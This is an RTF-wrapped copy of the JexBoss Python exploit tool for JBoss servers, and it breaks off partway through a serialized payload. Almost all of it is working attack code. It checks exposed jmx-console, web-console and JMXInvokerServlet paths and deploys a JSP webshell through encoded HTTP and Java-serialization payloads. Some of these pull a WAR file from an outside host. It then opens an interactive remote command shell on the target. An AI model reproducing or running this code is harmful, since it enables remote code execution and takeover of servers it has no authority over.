{\rtf1\ansi\deff0\nouicompat{\fonttbl{\f0\fnil\fcharset0 Calibri;}{\f1\fnil\fcharset238 Calibri;}}
{\colortbl ;\red0\green0\blue255;}
{\*\generator Riched20 10.0.19041}\viewkind4\uc1 
\pard\sa200\sl276\slmult1\f0\fs22\lang9 # coding: utf-8\par
\par
# JexBoss v1.0. @autor: Jo\'c3\f1\u402?\f0\'c2\'a3o Filho Matos Figueiredo (joaomatosf@gmail.com)\par
\par
# Updates: {{\field{\*\fldinst{HYPERLINK https://github.com/joaomatosf/jexboss }}{\fldrslt{https://github.com/joaomatosf/jexboss\ul0\cf0}}}}\f0\fs22\par
\par
# Free for distribution and modification, but the authorship should be preserved.\par
\par
\par
\par
\par
\par
import httplib, sys, urllib, os, time\par
\par
from urllib import urlencode\par
\par
\par
\par
RED = '\\x1b[91m'\par
\par
RED1 = '\\033[31m'\par
\par
BLUE = '\\033[94m'\par
\par
GREEN = '\\033[32m'\par
\par
BOLD = '\\033[1m'\par
\par
NORMAL = '\\033[0m'\par
\par
ENDC = '\\033[0m'\par
\par
\par
\par
def getHost(url):\par
\par
\tab tokens = url.split("://")\par
\par
\tab if len(tokens) == 2: #foi fornecido protocolo\par
\par
\tab\tab return tokens[1].split(":")[0]\par
\par
\tab else:\par
\par
\tab\tab return tokens.split(":")[0]\par
\par
\tab\tab\par
\par
def getProtocol(url):\par
\par
\tab tokens = url.split("://")\par
\par
\tab if tokens[0] == "https":\par
\par
\tab\tab return "https"\par
\par
\tab else:\par
\par
\tab\tab return "http"\par
\par
\par
\par
def getPort(url):\par
\par
\tab token = url[6:].split(":")\par
\par
\tab if len(token) == 2:\par
\par
\tab\tab return token[1]\par
\par
\tab elif getProtocol(url) == "https":\par
\par
\tab\tab return 443\par
\par
\tab else:\par
\par
\tab\tab return 80\par
\par
\tab\tab\par
\par
def getConnection(url):\par
\par
\tab if getProtocol(url) == "https":\par
\par
\tab\tab return httplib.HTTPSConnection(getHost(url), getPort(url))\par
\par
\tab else:\par
\par
\tab\tab return httplib.HTTPConnection(getHost(url), getPort(url))\par
\par
\tab\tab\par
\par
\par
\par
def getSuccessfully(url, path):\par
\par
\tab\tab result = 404\par
\par
\tab\tab time.sleep(5)\par
\par
\tab\tab conn = getConnection(url)\par
\par
\tab\tab conn.request("GET", path)\par
\par
\tab\tab result = conn.getresponse().status\par
\par
\tab\tab if result == 404:\par
\par
\tab\tab\tab conn.close()\par
\par
\tab\tab\tab time.sleep(7)\par
\par
\tab\tab\tab conn = getConnection(url)\par
\par
\tab\tab\tab conn.request("GET", path)\par
\par
\tab\tab\tab result = conn.getresponse().status\par
\par
\tab\tab\tab conn.close()\par
\par
\tab\tab return result\par
\par
\par
\par
def checkVul(url):\par
\par
\tab\par
\par
\tab print ( GREEN +" ** Checking Host: %s **\\n" %url )\par
\par
\tab\par
\par
\tab path = \{ "jmx-console"\tab\tab  : "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",\par
\par
\tab\tab\tab  "web-console" \tab\tab  : "/web-console/ServerInfo.jsp",\par
\par
\tab\tab\tab  "JMXInvokerServlet" : "/invoker/JMXInvokerServlet"\}\par
\par
\par
\par
\tab for i in path.keys():\par
\par
\tab\tab try:\par
\par
\tab\tab\tab print GREEN + " * Checking %s: \\t" %i + ENDC,\par
\par
\tab\tab\tab conn = getConnection(url)\par
\par
\tab\tab\tab conn.request("HEAD", path[i])\par
\par
\tab\tab\tab path[i] = conn.getresponse().status\par
\par
\tab\tab\tab if path[i] == 200 or path[i] == 500:\par
\par
\tab\tab\tab\tab print RED + "[ VULNERABLE ]" + ENDC\par
\par
\tab\tab\tab else: print GREEN + "[ OK ]"\par
\par
\tab\tab\tab conn.close()\par
\par
\tab\tab except:\par
\par
\tab\tab\tab print RED + "\\n * An error ocurred while contaction the host %s\\n" %url + ENDC\par
\par
\tab\tab\tab path[i] = 505\par
\par
\tab\tab\par
\par
\tab return path\par
\par
\par
\par
def autoExploit(url, type):\par
\par
\tab\par
\par
\tab # exploitJmxConsoleFileRepository: tested and working in jboss 4 and 5\par
\par
\tab # exploitJmxConsoleMainDeploy:\tab    tested and working in jboss 4 and 6\par
\par
\tab # exploitWebConsoleInvoker:\tab\tab    tested and working in jboss 4\par
\par
\tab # exploitJMXInvokerFileRepository: tested and working in jboss 4 and 5\par
\par
\tab\par
\par
\tab print GREEN + ("\\n * Sending exploit code to %s. Wait...\\n" %url)\par
\par
\tab result = 505\par
\par
\tab if type == "jmx-console":\par
\par
\tab\tab result = exploitJmxConsoleFileRepository(url)\par
\par
\tab\tab if result != 200 and result != 500:\par
\par
\tab\tab\tab result = exploitJmxConsoleMainDeploy(url)\par
\par
\tab elif type == "web-console":\par
\par
\tab\tab result = exploitWebConsoleInvoker(url)\par
\par
\tab elif type == "JMXInvokerServlet":\par
\par
\tab\tab result = exploitJMXInvokerFileRepository(url)\par
\par
\par
\par
\tab if result == 200 or result == 500:\par
\par
\tab\tab print GREEN + " * Successfully deployed code! Starting command shell, wait...\\n" + ENDC\par
\par
\tab\tab shell_http(url, type)\par
\par
\tab else:\par
\par
\tab\tab print (RED + "\\n * Could not exploit the flaw automatically. Exploitation requires manual analysis...\\n" \par
\par
\tab\tab\tab\tab     "   Waiting for 7 seconds...\\n "+ ENDC)\par
\par
\tab\tab time.sleep(7)\par
\par
\par
\par
def shell_http(url, type):\par
\par
\tab if type == "jmx-console" or type == "web-console":\par
\par
\tab\tab path = '/jbossass/jbossass.jsp?'\par
\par
\tab elif type == "JMXInvokerServlet":\par
\par
\tab\tab path = '/shellinvoker/shellinvoker.jsp?'\par
\par
\par
\par
\tab conn = getConnection(url)\par
\par
\tab conn.request("GET", path)\par
\par
\tab conn.close()\par
\par
\tab time.sleep(7)\par
\par
\tab resp = ""\par
\par
\tab #clear()\par
\par
\tab print " * - - - - - - - - - - - - - - - - - - - - LOL - - - - - - - - - - - - - - - - - - - - * \\n"\par
\par
\tab print RED+" * "+url+": \\n"+ENDC\par
\par
\tab headers = \{"User-Agent" : "jexboss"\}\par
\par
\tab for cmd in ['uname -a', 'cat /etc/issue', 'id']:\par
\par
\tab\tab conn = getConnection(url)\par
\par
\tab\tab cmd = urlencode(\{"ppp": cmd\})\par
\par
\tab\tab conn.request("GET", path+cmd, '', headers)\par
\par
\tab\tab resp += " "+conn.getresponse().read().split(">")[1]\par
\par
\tab print resp,\par
\par
\tab\par
\par
\tab while 1:\par
\par
\tab\tab print BLUE + "[Type commands or \\"exit\\" to finish]"\par
\par
\tab\tab cmd=raw_input("Shell> "+ENDC)\par
\par
\tab\tab #print ENDC\par
\par
\tab\tab if cmd == "exit":\par
\par
\tab\tab\tab break\par
\par
\tab\tab conn = getConnection(url)\par
\par
\tab\tab cmd = urlencode(\{"ppp": cmd\})\par
\par
\tab\tab conn.request("GET", path+cmd, '', headers)\par
\par
\tab\tab resp = conn.getresponse()\par
\par
\tab\tab if resp.status == 404:\par
\par
\tab\tab\tab print RED+ " * Error contacting the commando shell. Try again later..."\par
\par
\tab\tab\tab conn.close()\par
\par
\tab\tab\tab continue\par
\par
\tab\tab stdout = ""\par
\par
\tab\tab try:\par
\par
\tab\tab\tab stdout = resp.read().split("pre>")[1]\par
\par
\tab\tab except:\par
\par
\tab\tab\tab print RED+ " * Error contacting the commando shell. Try again later..."\par
\par
\tab\tab if stdout.count("An exception occurred processing JSP page") == 1:\par
\par
\tab\tab\tab print RED + " * Error executing command \\"%s\\". " %cmd.split("=")[1] + ENDC\par
\par
\tab\tab else: print stdout,\par
\par
\tab\tab conn.close()\par
\par
\par
\par
def exploitJmxConsoleMainDeploy(url):\par
\par
\tab # MainDeployer\par
\par
\tab # does not work in jboss5 (bug in jboss5)\par
\par
\tab # shell in link\par
\par
\tab # /jmx-console/HtmlAdaptor\par
\par
\tab jsp = "{{\field{\*\fldinst{HYPERLINK http://www.joaomatosf.com/rnp/jbossass.war }}{\fldrslt{http://www.joaomatosf.com/rnp/jbossass.war\ul0\cf0}}}}\f0\fs22 "\par
\par
\tab payload =(  "/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service"\par
\par
\tab\tab\tab\tab "=MainDeployer&methodIndex=19&arg0="+jsp)\par
\par
\tab print ( GREEN+ "\\n * Info: This exploit will force the server to deploy the webshell "\par
\par
\tab\tab\tab        "\\n   available on: "+jsp +ENDC)\par
\par
\tab conn = getConnection(url)\par
\par
\tab conn.request("HEAD", payload)\par
\par
\tab result = conn.getresponse().status\par
\par
\tab conn.close()\par
\par
\tab return getSuccessfully(url, "/jbossass/jbossass.jsp")\tab\par
\par
\par
\par
def exploitJmxConsoleFileRepository(url):\par
\par
\tab\tab # DeploymentFileRepository\par
\par
\tab\tab # tested and work in jboss4, 5.\par
\par
\tab\tab # doest not work in jboss6\par
\par
\tab\tab # shell jsp\par
\par
\tab\tab # /jmx-console/HtmlAdaptor\par
\par
\tab\tab jsp =("%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61"\par
\par
\tab\tab\tab   "%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%22%25%3E%3C"\par
\par
\tab\tab\tab   "%70%72%65%3E%3C%25%20%69%66%20%28%72%65%71%75%65%73%74%2E%67%65"\par
\par
\tab\tab\tab   "%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29%20%21%3D%20"\par
\par
\tab\tab\tab   "%6E%75%6C%6C%20%26%26%20%72%65%71%75%65%73%74%2E%67%65%74%48%65"\par
\par
\tab\tab\tab   "%61%64%65%72%28%22%75%73%65%72%2D%61%67%65%6E%74%22%29%2E%65%71"\par
\par
\tab\tab\tab   "%75%61%6C%73%28%22%6A%65%78%62%6F%73%73%22%29%29%20%7B%20%50%72"\par
\par
\tab\tab\tab   "%6F%63%65%73%73%20%70%20%3D%20%52%75%6E%74%69%6D%65%2E%67%65%74"\par
\par
\tab\tab\tab   "%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%72%65%71%75%65%73"\par
\par
\tab\tab\tab   "%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72%28%22%70%70%70%22%29"\par
\par
\tab\tab\tab   "%29%3B%20%44%61%74%61%49%6E%70%75%74%53%74%72%65%61%6D%20%64%69"\par
\par
\tab\tab\tab   "%73%20%3D%20%6E%65%77%20%44%61%74%61%49%6E%70%75%74%53%74%72%65"\par
\par
\tab\tab\tab   "%61%6D%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29"\par
\par
\tab\tab\tab   "%29%3B%20%53%74%72%69%6E%67%20%64%69%73%72%20%3D%20%64%69%73%2E"\par
\par
\tab\tab\tab   "%72%65%61%64%4C%69%6E%65%28%29%3B%20%77%68%69%6C%65%20%28%20%64"\par
\par
\tab\tab\tab   "%69%73%72%20%21%3D%20%6E%75%6C%6C%20%29%20%7B%20%6F%75%74%2E%70"\par
\par
\tab\tab\tab   "%72%69%6E%74%6C%6E%28%64%69%73%72%29%3B%20%64%69%73%72%20%3D%20"\par
\par
\tab\tab\tab   "%64%69%73%2E%72%65%61%64%4C%69%6E%65%28%29%3B%20%7D%20%7D%25%3E" )\par
\par
\tab\tab\tab   \par
\par
\tab\tab payload =("/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service="\par
\par
\tab\tab            "DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0="\par
\par
\tab\tab            "jbossass.war&argType=java.lang.String&arg1=jbossass&argType=java.lang.St"\par
\par
\tab\tab            "ring&arg2=.jsp&argType=java.lang.String&arg3="+jsp+"&argType=boolean&arg4=True")\par
\par
\tab\tab\par
\par
\tab\tab conn = getConnection(url)\par
\par
\tab\tab conn.request("HEAD", payload)\par
\par
\tab\tab result = conn.getresponse().status\par
\par
\tab\tab conn.close()\par
\par
\tab\tab return getSuccessfully(url, "/jbossass/jbossass.jsp")\par
\par
\tab\tab\par
\par
def exploitJMXInvokerFileRepository(url):\par
\par
\tab # tested and work in jboss4, 5\par
\par
\tab # MainDeploy, shell in data\par
\par
\tab # /invoker/JMXInvokerServlet\par
\par
\tab payload = ( "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x29\\x6f\\x72\\x67\\x2e\\x6a\\x62\\x6f\\x73"\par
\par
\tab\tab\tab\tab "\\x73\\x2e\\x69\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x2e\\x4d\\x61\\x72"\par
\par
\tab\tab\tab\tab "\\x73\\x68\\x61\\x6c\\x6c\\x65\\x64\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f"\par
\par
\tab\tab\tab\tab "\\x6e\\xf6\\x06\\x95\\x27\\x41\\x3e\\xa4\\xbe\\x0c\\x00\\x00\\x78\\x70\\x70\\x77"\par
\par
\tab\tab\tab\tab "\\x08\\x78\\x94\\x98\\x47\\xc1\\xd0\\x53\\x87\\x73\\x72\\x00\\x11\\x6a\\x61\\x76"\par
\par
\tab\tab\tab\tab "\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x49\\x6e\\x74\\x65\\x67\\x65\\x72\\x12\\xe2"\par
\par
\tab\tab\tab\tab "\\xa0\\xa4\\xf7\\x81\\x87\\x38\\x02\\x00\\x01\\x49\\x00\\x05\\x76\\x61\\x6c\\x75"\par
\par
\tab\tab\tab\tab "\\x65\\x78\\x72\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4e"\par
\par
\tab\tab\tab\tab "\\x75\\x6d\\x62\\x65\\x72\\x86\\xac\\x95\\x1d\\x0b\\x94\\xe0\\x8b\\x02\\x00\\x00"\par
\par
\tab\tab\tab\tab "\\x78\\x70\\xe3\\x2c\\x60\\xe6\\x73\\x72\\x00\\x24\\x6f\\x72\\x67\\x2e\\x6a\\x62"\par
\par
\tab\tab\tab\tab "\\x6f\\x73\\x73\\x2e\\x69\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x2e\\x4d"\par
\par
\tab\tab\tab\tab "\\x61\\x72\\x73\\x68\\x61\\x6c\\x6c\\x65\\x64\\x56\\x61\\x6c\\x75\\x65\\xea\\xcc"\par
\par
\tab\tab\tab\tab "\\xe0\\xd1\\xf4\\x4a\\xd0\\x99\\x0c\\x00\\x00\\x78\\x70\\x7a\\x00\\x00\\x02\\xc6"\par
\par
\tab\tab\tab\tab "\\x00\\x00\\x02\\xbe\\xac\\xed\\x00\\x05\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61"\par
\par
\tab\tab\tab\tab "\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x90"\par
\par
\tab\tab\tab\tab "\\xce\\x58\\x9f\\x10\\x73\\x29\\x6c\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x04"\par
\par
\tab\tab\tab\tab "\\x73\\x72\\x00\\x1b\\x6a\\x61\\x76\\x61\\x78\\x2e\\x6d\\x61\\x6e\\x61\\x67\\x65"\par
\par
\tab\tab\tab\tab "\\x6d\\x65\\x6e\\x74\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x4e\\x61\\x6d\\x65\\x0f"\par
\par
\tab\tab\tab\tab "\\x03\\xa7\\x1b\\xeb\\x6d\\x15\\xcf\\x03\\x00\\x00\\x78\\x70\\x74\\x00\\x2c\\x6a"\par
\par
\tab\tab\tab\tab "\\x62\\x6f\\x73\\x73\\x2e\\x61\\x64\\x6d\\x69\\x6e\\x3a\\x73\\x65\\x72\\x76\\x69"\par
\par
\tab\tab\tab\tab "\\x63\\x65\\x3d\\x44\\x65\\x70\\x6c\\x6f\\x79\\x6d\\x65\\x6e\\x74\\x46\\x69\\x6c"\par
\par
\tab\tab\tab\tab "\\x65\\x52\\x65\\x70\\x6f\\x73\\x69\\x74\\x6f\\x72\\x79\\x78\\x74\\x00\\x05\\x73"\par
\par
\tab\tab\tab\tab "\\x74\\x6f\\x72\\x65\\x75\\x71\\x00\\x7e\\x00\\x00\\x00\\x00\\x00\\x05\\x74\\x00"\par
\par
\tab\tab\tab\tab "\\x10\\x73\\x68\\x65\\x6c\\x6c\\x69\\x6e\\x76\\x6f\\x6b\\x65\\x72\\x2e\\x77\\x61"\par
\par
\tab\tab\tab\tab "\\x72\\x74\\x00\\x0c\\x73\\x68\\x65\\x6c\\x6c\\x69\\x6e\\x76\\x6f\\x6b\\x65\\x72"\par
\par
\tab\tab\tab\tab "\\x74\\x00\\x04\\x2e\\x6a\\x73\\x70\\x74\\x01\\x79\\x3c\\x25\\x40\\x20\\x70\\x61"\par
\par
\tab\tab\tab\tab "\\x67\\x65\\x20\\x69\\x6d\\x70\\x6f\\x72\\x74\\x3d\\x22\\x6a\\x61\\x76\\x61\\x2e"\par
\par
\tab\tab\tab\tab "\\x75\\x74\\x69\\x6c\\x2e\\x2a\\x2c\\x6a\\x61\\x76\\x61\\x2e\\x69\\x6f\\x2e\\x2a"\par
\par
\tab\tab\tab\tab "\\x22\\x25\\x3e\\x3c\\x70\\x72\\x65\\x3e\\x3c\\x25\\x69\\x66\\x28\\x72\\x65\\x71"\par
\par
\tab\tab\tab\tab "\\x75\\x65\\x73\\x74\\x2e\\x67\\x65\\x74\\x50\\x61\\x72\\x61\\x6d\\x65\\x74\\x65"\par
\par
\tab\tab\tab\tab "\\x72\\x28\\x22\\x70\\x70\\x70\\x22\\x29\\x20\\x21\\x3d\\x20\\x6e\\x75\\x6c\\x6c"\par
\par
\tab\tab\tab\tab "\\x20\\x26\\x26\\x20\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x67\\x65\\x74\\x48"\par
\par
\tab\tab\tab\tab "\\x65\\x61\\x64\\x65\\x72\\x28\\x22\\x75\\x73\\x65\\x72\\x2d\\x61\\x67\\x65\\x6e"\par
\par
\tab\tab\tab\tab "\\x74\\x22\\x29\\x2e\\x65\\x71\\x75\\x61\\x6c\\x73\\x28\\x22\\x6a\\x65\\x78\\x62"\par
\par
\tab\tab\tab\tab "\\x6f\\x73\\x73\\x22\\x29\\x20\\x29\\x20\\x7b\\x20\\x50\\x72\\x6f\\x63\\x65\\x73"\par
\par
\tab\tab\tab\tab "\\x73\\x20\\x70\\x20\\x3d\\x20\\x52\\x75\\x6e\\x74\\x69\\x6d\\x65\\x2e\\x67\\x65"\par
\par
\tab\tab\tab\tab "\\x74\\x52\\x75\\x6e\\x74\\x69\\x6d\\x65\\x28\\x29\\x2e\\x65\\x78\\x65\\x63\\x28"\par
\par
\tab\tab\tab\tab "\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x2e\\x67\\x65\\x74\\x50\\x61\\x72\\x61\\x6d"\par
\par
\tab\tab\tab\tab "\\x65\\x74\\x65\\x72\\x28\\x22\\x70\\x70\\x70\\x22\\x29\\x29\\x3b\\x20\\x44\\x61"\par
\par
\tab\tab\tab\tab "\\x74\\x61\\x49\\x6e\\x70\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6d\\x20\\x64\\x69"\par
\par
\tab\tab\tab\tab "\\x73\\x20\\x3d\\x20\\x6e\\x65\\x77\\x20\\x44\\x61\\x74\\x61\\x49\\x6e\\x70\\x75"\par
\par
\tab\tab\tab\tab "\\x74\\x53\\x74\\x72\\x65\\x61\\x6d\\x28\\x70\\x2e\\x67\\x65\\x74\\x49\\x6e\\x70"\par
\par
\tab\tab\tab\tab "\\x75\\x74\\x53\\x74\\x72\\x65\\x61\\x6d\\x28\\x29\\x29\\x3b\\x20\\x53\\x74\\x72"\par
\par
\tab\tab\tab\tab "\\x69\\x6e\\x67\\x20\\x64\\x69\\x73\\x72\\x20\\x3d\\x20\\x64\\x69\\x73\\x2e\\x72"\par
\par
\tab\tab\tab\tab "\\x65\\x61\\x64\\x4c\\x69\\x6e\\x65\\x28\\x29\\x3b\\x20\\x77\\x68\\x69\\x6c\\x65"\par
\par
\tab\tab\tab\tab "\\x20\\x28\\x20\\x64\\x69\\x73\\x72\\x20\\x21\\x3d\\x20\\x6e\\x75\\x6c\\x6c\\x20"\par
\par
\tab\tab\tab\tab "\\x29\\x20\\x7b\\x20\\x6f\\x75\\x74\\x2e\\x70\\x72\\x69\\x6e\\x74\\x6c\\x6e\\x28"\par
\par
\tab\tab\tab\tab "\\x64\\x69\\x73\\x72\\x29\\x3b\\x20\\x64\\x69\\x73\\x72\\x20\\x3d\\x20\\x64\\x69"\par
\par
\tab\tab\tab\tab "\\x73\\x2e\\x72\\x65\\x61\\x64\\x4c\\x69\\x6e\\x65\\x28\\x29\\x3b\\x20\\x7d\\x20"\par
\par
\tab\tab\tab\tab "\\x7d\\x25\\x3e\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67"\par
\par
\tab\tab\tab\tab "\\x2e\\x42\\x6f\\x6f\\x6c\\x65\\x61\\x6e\\xcd\\x20\\x72\\x80\\xd5\\x9c\\xfa\\xee"\par
\par
\tab\tab\tab\tab "\\x02\\x00\\x01\\x5a\\x00\\x05\\x76\\x61\\x6c\\x75\\x65\\x78\\x70\\x01\\x75\\x72"\par
\par
\tab\tab\tab\tab "\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74"\par
\par
\tab\tab\tab\tab "\\x72\\x69\\x6e\\x67\\x3b\\xad\\xd2\\x56\\xe7\\xe9\\x1d\\x7b\\x47\\x02\\x00\\x00"\par
\par
\tab\tab\tab\tab "\\x78\\x70\\x00\\x00\\x00\\x05\\x74\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61"\par
\par
\tab\tab\tab\tab "\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e\\x67\\x71\\x00\\x7e\\x00\\x0f\\x71\\x00"\par
\par
\tab\tab\tab\tab "\\x7e\\x00\\x0f\\x71\\x00\\x7e\\x00\\x0f\\x74\\x00\\x07\\x62\\x6f\\x6f\\x6c\\x65"\par
\par
\tab\tab\tab\tab "\\x61\\x6e\\x63\\x79\\xb8\\x87\\x78\\x77\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00"\par
\par
\tab\tab\tab\tab "\\x01\\x73\\x72\\x00\\x22\\x6f\\x72\\x67\\x2e\\x6a\\x62\\x6f\\x73\\x73\\x2e\\x69"\par
\par
\tab\tab\tab\tab "\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x2e\\x49\\x6e\\x76\\x6f\\x63\\x61"\par
\par
\tab\tab\tab\tab "\\x74\\x69\\x6f\\x6e\\x4b\\x65\\x79\\xb8\\xfb\\x72\\x84\\xd7\\x93\\x85\\xf9\\x02"\par
\par
\tab\tab\tab\tab "\\x00\\x01\\x49\\x00\\x07\\x6f\\x72\\x64\\x69\\x6e\\x61\\x6c\\x78\\x70\\x00\\x00"\par
\par
\tab\tab\tab\tab "\\x00\\x04\\x70\\x78")\par
\par
\tab conn = getConnection(url)\par
\par
\tab headers = \{ "Content-Type" : "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue",\par
\par
\tab\tab\tab\tab "Accept"  : "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"\}\par
\par
\tab conn.request("POST", "/invoker/JMXInvokerServlet", payload, headers)\par
\par
\tab response = conn.getresponse()\par
\par
\tab result = response.status\par
\par
\tab if result == 401:\par
\par
\tab\tab print "   Retrying..."\par
\par
\tab\tab conn.close()\par
\par
\tab\tab conn.request("HEAD", "/invoker/JMXInvokerServlet", payload, headers)\par
\par
\tab\tab response = conn.getresponse()\par
\par
\tab\tab result = response.status\par
\par
\tab if response.read().count("Failed") > 0:\par
\par
\tab\tab result = 505\par
\par
\tab conn.close\par
\par
\tab return getSuccessfully(url, "/shellinvoker/shellinvoker.jsp")\par
\par
\tab\par
\par
def exploitWebConsoleInvoker(url):\par
\par
\tab # does not work in jboss5 (bug in jboss5)\par
\par
\tab # MainDeploy, shell in link\par
\par
\tab # /web-console/Invoker\par
\par
\tab #jsp = "{{\field{\*\fldinst{HYPERLINK http://www.joaomatosf.com/rnp/jbossass.war }}{\fldrslt{http://www.joaomatosf.com/rnp/jbossass.war\ul0\cf0}}}}\f0\fs22 "\par
\par
\tab #jsp = "{{\field{\*\fldinst{HYPERLINK "\\\\\\\\x"}}{\fldrslt{\\\\x\ul0\cf0}}}}\f0\fs22 ".join("\{:02x\}".format(ord(c)) for c in jsp)\par
\par
\tab #jsp = "{{\field{\*\fldinst{HYPERLINK "\\\\\\\\x"}}{\fldrslt{\\\\x\ul0\cf0}}}}\f0\fs22 " + jsp\par
\par
\tab payload = ( "\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x2e\\x6f\\x72\\x67\\x2e"\par
\par
\tab\tab\tab\tab "\\x6a\\x62\\x6f\\x73\\x73\\x2e\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65\\x2e\\x72\\x65"\par
\par
\tab\tab\tab\tab "\\x6d\\x6f\\x74\\x65\\x2e\\x52\\x65\\x6d\\x6f\\x74\\x65\\x4d\\x42\\x65\\x61\\x6e"\par
\par
\tab\tab\tab\tab "\\x49\\x6e\\x76\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\xe0\\x4f\\xa3\\x7a\\x74\\xae"\par
\par
\tab\tab\tab\tab "\\x8d\\xfa\\x02\\x00\\x04\\x4c\\x00\\x0a\\x61\\x63\\x74\\x69\\x6f\\x6e\\x4e\\x61"\par
\par
\tab\tab\tab\tab "\\x6d\\x65\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f"\par
\par
\tab\tab\tab\tab "\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x5b\\x00\\x06\\x70\\x61\\x72\\x61\\x6d\\x73"\par
\par
\tab\tab\tab\tab "\\x74\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x4f"\par
\par
\tab\tab\tab\tab "\\x62\\x6a\\x65\\x63\\x74\\x3b\\x5b\\x00\\x09\\x73\\x69\\x67\\x6e\\x61\\x74\\x75"\par
\par
\tab\tab\tab\tab "\\x72\\x65\\x74\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67"\par
\par
\tab\tab\tab\tab "\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x10\\x74\\x61\\x72\\x67\\x65"\par
\par
\tab\tab\tab\tab "\\x74\\x4f\\x62\\x6a\\x65\\x63\\x74\\x4e\\x61\\x6d\\x65\\x74\\x00\\x1d\\x4c\\x6a"\par
\par
\tab\tab\tab\tab "\\x61\\x76\\x61\\x78\\x2f\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x2f"\par
\par
\tab\tab\tab\tab "\\x4f\\x62\\x6a\\x65\\x63\\x74\\x4e\\x61\\x6d\\x65\\x3b\\x78\\x70\\x74\\x00\\x06"\par
\par
\tab\tab\tab\tab "\\x64\\x65\\x70\\x6c\\x6f\\x79\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61"\par
\par
\tab\tab\tab\tab "\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x90\\xce\\x58"\par
\par
\tab\tab\tab\tab "\\x9f\\x10\\x73\\x29\\x6c\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00"\par
\par
\tab\tab\tab\tab "\\x2a"\par
\par
\tab\tab\tab\tab #link\par
\par
\tab\tab\tab\tab "\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x6a\\x6f\\x61\\x6f\\x6d\\x61"\par
\par
\tab\tab\tab\tab "\\x74\\x6f\\x73\\x66\\x2e\\x63\\x6f\\x6d\\x2f\\x72\\x6e\\x70\\x2f\\x6a\\x62\\x6f"\par
\par
\tab\tab\tab\tab "\\x73\\x73\\x61\\x73\\x73\\x2e\\x77\\x61\\x72"\par
\par
\tab\tab\tab\tab #end\par
\par
\tab\tab\tab\tab "\\x75\\x72\\x00\\x13\\x5b"\par
\par
\tab\tab\tab\tab "\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e"\par
\par
\tab\tab\tab\tab "\\x67\\x3b\\xad\\xd2\\x56\\xe7\\xe9\\x1d\\x7b\\x47\\x02\\x00\\x00\\x78\\x70\\x00"\par
\par
\tab\tab\tab\tab "\\x00\\x00\\x01\\x74\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e"\par
\par
\tab\tab\tab\tab "\\x53\\x74\\x72\\x69\\x6e\\x67\\x73\\x72\\x00\\x1b\\x6a\\x61\\x76\\x61\\x78\\x2e"\par
\par
\tab\tab\tab\tab "\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x2e\\x4f\\x62\\x6a\\x65\\x63"\par
\par
\tab\tab\tab\tab "\\x74\\x4e\\x61\\x6d\\x65\\x0f\\x03\\xa7\\x1b\\xeb\\x6d\\x15\\xcf\\x03\\x00\\x00"\par
\par
\tab\tab\tab\tab "\\x78\\x70\\x74\\x00\\x21\\x6a\\x62\\x6f\\x73\\x73\\x2e\\x73\\x79\\x73\\x74\\x65"\par
\par
